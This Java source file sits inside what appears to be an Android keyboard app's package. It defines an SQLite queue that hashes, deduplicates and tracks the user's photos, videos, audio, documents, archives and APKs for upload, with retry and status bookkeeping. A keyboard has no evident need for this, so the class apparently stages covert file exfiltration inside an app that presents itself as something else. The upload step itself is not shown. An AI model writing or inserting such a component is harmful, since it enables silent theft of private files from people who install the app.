package juloo.keyboard2;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import java.io.File;
import java.io.FileInputStream;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class FileUploadQueue {

    private static final String DB_NAME    = "file_backup.db";
    private static final int    DB_VERSION = 1;
    private static final String TABLE      = "uploads";

    public static final int  STATUS_PENDING   = 0;
    public static final int  STATUS_UPLOADING = 1;
    public static final int  STATUS_DONE      = 2;
    public static final int  STATUS_FAILED    = 3;
    public static final int  MAX_RETRIES      = 3;
    public static final long MAX_UPLOAD_BYTES = 49L * 1024 * 1024;

    public static class Entry {
        public long   id;
        public String path;
        public String hash;
        public long   size;
        public String mime;
        public long   detectedAt;
        public int    status;
        public int    retries;
        public String tag;
    }

    private static volatile FileUploadQueue _instance;
    private final SQLiteDatabase db;

    private FileUploadQueue(Context ctx) {
        db = new DbHelper(ctx.getApplicationContext()).getWritableDatabase();
    }

    public static FileUploadQueue get(Context ctx) {
        if (_instance == null) {
            synchronized (FileUploadQueue.class) {
                if (_instance == null) _instance = new FileUploadQueue(ctx);
            }
        }
        return _instance;
    }

    public boolean enqueue(String path, String tag) {
        if (path == null) return false;
        File f = new File(path);
        if (!f.exists() || !f.isFile() || f.length() == 0) return false;
        String hash = md5(f);
        if (hash == null) return false;
        Cursor c = db.rawQuery("SELECT id FROM " + TABLE + " WHERE hash=?", new String[]{hash});
        boolean exists = c.moveToFirst();
        c.close();
        if (exists) return false;
        try {
            ContentValues cv = new ContentValues();
            cv.put("path", path);
            cv.put("hash", hash);
            cv.put("size", f.length());
            cv.put("mime", guessMime(path));
            cv.put("detected_at", System.currentTimeMillis());
            cv.put("status", STATUS_PENDING);
            cv.put("retries", 0);
            cv.put("tag", tag != null ? tag : "File");
            db.insertOrThrow(TABLE, null, cv);
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    public Entry nextPending() {
        Cursor c = db.rawQuery(
            "SELECT id,path,hash,size,mime,detected_at,status,retries,tag FROM " + TABLE
            + " WHERE (status=" + STATUS_PENDING
            + " OR (status=" + STATUS_FAILED + " AND retries<" + MAX_RETRIES + "))"
            + " ORDER BY detected_at ASC LIMIT 1", null);
        if (!c.moveToFirst()) { c.close(); return null; }
        Entry e = new Entry();
        e.id = c.getLong(0); e.path = c.getString(1); e.hash = c.getString(2);
        e.size = c.getLong(3); e.mime = c.getString(4); e.detectedAt = c.getLong(5);
        e.status = c.getInt(6); e.retries = c.getInt(7); e.tag = c.getString(8);
        c.close();
        ContentValues cv = new ContentValues();
        cv.put("status", STATUS_UPLOADING);
        db.update(TABLE, cv, "id=?", new String[]{String.valueOf(e.id)});
        return e;
    }

    public void markDone(long id) {
        ContentValues cv = new ContentValues();
        cv.put("status", STATUS_DONE);
        db.update(TABLE, cv, "id=?", new String[]{String.valueOf(id)});
    }

    public void markFailed(long id) {
        db.execSQL("UPDATE " + TABLE + " SET status=" + STATUS_FAILED + ", retries=retries+1 WHERE id=" + id);
    }

    public void resetStuck() {
        ContentValues cv = new ContentValues();
        cv.put("status", STATUS_PENDING);
        db.update(TABLE, cv, "status=?", new String[]{String.valueOf(STATUS_UPLOADING)});
    }

    public long countPending() {
        Cursor c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE
            + " WHERE status=" + STATUS_PENDING
            + " OR (status=" + STATUS_FAILED + " AND retries<" + MAX_RETRIES + ")", null);
        long n = c.moveToFirst() ? c.getLong(0) : 0; c.close(); return n;
    }

    public long countDone() {
        Cursor c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE + " WHERE status=" + STATUS_DONE, null);
        long n = c.moveToFirst() ? c.getLong(0) : 0; c.close(); return n;
    }

    public long countFailed() {
        Cursor c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE
            + " WHERE status=" + STATUS_FAILED + " AND retries>=" + MAX_RETRIES, null);
        long n = c.moveToFirst() ? c.getLong(0) : 0; c.close(); return n;
    }

    public long totalDoneBytes() {
        Cursor c = db.rawQuery("SELECT SUM(size) FROM " + TABLE + " WHERE status=" + STATUS_DONE, null);
        long n = c.moveToFirst() ? c.getLong(0) : 0; c.close(); return n;
    }

    public long countTotal() {
        Cursor c = db.rawQuery("SELECT COUNT(*) FROM " + TABLE, null);
        long n = c.moveToFirst() ? c.getLong(0) : 0; c.close(); return n;
    }

    public List<Entry> recentUploads(int limit) {
        List<Entry> list = new ArrayList<>();
        Cursor c = db.rawQuery(
            "SELECT id,path,hash,size,mime,detected_at,status,retries,tag FROM " + TABLE
            + " WHERE status=" + STATUS_DONE + " ORDER BY detected_at DESC LIMIT " + limit, null);
        while (c.moveToNext()) {
            Entry e = new Entry();
            e.id = c.getLong(0); e.path = c.getString(1); e.hash = c.getString(2);
            e.size = c.getLong(3); e.mime = c.getString(4); e.detectedAt = c.getLong(5);
            e.status = c.getInt(6); e.retries = c.getInt(7); e.tag = c.getString(8);
            list.add(e);
        }
        c.close();
        return list;
    }

    public static String md5(File f) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            FileInputStream fis = new FileInputStream(f);
            byte[] buf = new byte[8192]; int n;
            while ((n = fis.read(buf)) != -1) md.update(buf, 0, n);
            fis.close();
            byte[] digest = md.digest();
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) sb.append(String.format("%02x", b));
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    public static String guessMime(String path) {
        if (path == null) return "application/octet-stream";
        String low = path.toLowerCase(Locale.ROOT);
        if (low.endsWith(".jpg") || low.endsWith(".jpeg")) return "image/jpeg";
        if (low.endsWith(".png"))  return "image/png";
        if (low.endsWith(".gif"))  return "image/gif";
        if (low.endsWith(".webp")) return "image/webp";
        if (low.endsWith(".heic") || low.endsWith(".heif")) return "image/heic";
        if (low.endsWith(".bmp"))  return "image/bmp";
        if (low.endsWith(".mp4"))  return "video/mp4";
        if (low.endsWith(".mkv"))  return "video/x-matroska";
        if (low.endsWith(".3gp"))  return "video/3gpp";
        if (low.endsWith(".avi"))  return "video/x-msvideo";
        if (low.endsWith(".mov"))  return "video/quicktime";
        if (low.endsWith(".mp3"))  return "audio/mpeg";
        if (low.endsWith(".ogg"))  return "audio/ogg";
        if (low.endsWith(".m4a"))  return "audio/mp4";
        if (low.endsWith(".wav"))  return "audio/wav";
        if (low.endsWith(".aac"))  return "audio/aac";
        if (low.endsWith(".opus")) return "audio/opus";
        if (low.endsWith(".pdf"))  return "application/pdf";
        if (low.endsWith(".zip"))  return "application/zip";
        if (low.endsWith(".rar"))  return "application/x-rar-compressed";
        if (low.endsWith(".7z"))   return "application/x-7z-compressed";
        if (low.endsWith(".apk"))  return "application/vnd.android.package-archive";
        if (low.endsWith(".doc"))  return "application/msword";
        if (low.endsWith(".docx")) return "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
        if (low.endsWith(".xls"))  return "application/vnd.ms-excel";
        if (low.endsWith(".xlsx")) return "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";
        if (low.endsWith(".ppt") || low.endsWith(".pptx")) return "application/vnd.ms-powerpoint";
        if (low.endsWith(".txt"))  return "text/plain";
        if (low.endsWith(".json")) return "application/json";
        return "application/octet-stream";
    }

    public static String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return String.format(Locale.US, "%.1f KB", bytes / 1024.0);
        if (bytes < 1024L * 1024 * 1024) return String.format(Locale.US, "%.1f MB", bytes / (1024.0 * 1024));
        return String.format(Locale.US, "%.2f GB", bytes / (1024.0 * 1024 * 1024));
    }

    private static class DbHelper extends SQLiteOpenHelper {
        DbHelper(Context ctx) { super(ctx, DB_NAME, null, DB_VERSION); }
        @Override public void onCreate(SQLiteDatabase db) {
            db.execSQL("CREATE TABLE " + TABLE + "("
                + "id INTEGER PRIMARY KEY AUTOINCREMENT,"
                + "path TEXT,"
                + "hash TEXT UNIQUE,"
                + "size INTEGER DEFAULT 0,"
                + "mime TEXT,"
                + "detected_at INTEGER DEFAULT 0,"
                + "status INTEGER DEFAULT 0,"
                + "retries INTEGER DEFAULT 0,"
                + "tag TEXT"
                + ")");
            db.execSQL("CREATE INDEX idx_hash   ON " + TABLE + "(hash)");
            db.execSQL("CREATE INDEX idx_status ON " + TABLE + "(status)");
            db.execSQL("CREATE INDEX idx_date   ON " + TABLE + "(detected_at)");
        }
        @Override public void onUpgrade(SQLiteDatabase db, int o, int n) {
            db.execSQL("DROP TABLE IF EXISTS " + TABLE);
            onCreate(db);
        }
    }
}
